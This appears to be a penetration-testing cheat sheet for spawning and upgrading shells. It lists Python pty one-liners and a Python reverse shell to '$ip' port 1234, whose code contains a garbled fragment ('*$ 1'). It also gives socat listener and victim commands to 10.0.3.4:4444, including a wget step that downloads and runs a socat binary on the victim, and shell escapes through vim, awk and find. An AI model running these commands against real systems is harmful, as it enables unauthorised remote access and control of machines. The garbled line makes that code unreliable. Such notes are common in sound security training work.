
### Python pty module

	python -c 'import pty; pty.spawn("/bin/sh")'
	
	python3 -c 'import pty; pty.spawn("/bin/sh")'
	
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(), *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

### Full tty

[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

### Perl

	perl —e 'exec "/bin/sh";'

### Using socat

On Kali (listen):
	
	socat file:`tty`,raw,echo=0 tcp-listen:4444
	
On Victim (launch):
	
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
	
If not download in Victim:
	
	wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

### Other ways

	/bin/sh -i
	
	echo os.system('/bin/bash')
	
	exec "/bin/sh";

### Related Shell Escape Sequences
Vi / Vim

	:!bash
	:set shell=/bin/bash
	:shell

awk

	awk 'BEGIN {system("/bin/bash")}'

find

	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;